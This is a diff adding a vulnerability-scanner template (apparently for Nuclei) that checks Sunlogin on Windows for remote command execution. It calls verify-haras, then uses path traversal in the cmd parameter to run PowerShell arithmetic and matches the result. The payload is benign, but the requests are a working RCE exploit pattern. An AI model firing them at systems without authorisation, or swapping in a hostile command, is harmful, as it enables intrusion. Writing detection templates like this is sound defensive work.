@@ -1,0 +1,30 @@
+id: sunlogin-windows-rce
+
+info:
+  name: 向日葵 Windows cgi-bin - rce
+  author: leadlife
+  severity: critical
+  description: 向日葵 Windows 版本存在远程命令执行漏洞
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query:
+  tags: sunlogin,2022,rce
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        GET /check?cmd=ping../../../../../../../../../../windows/system32/windowspowershell/v1.0/powershell%208495*1673 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 &&  status_code_2 == 200
+          - contains(body_2,'14212135')
+        condition: and
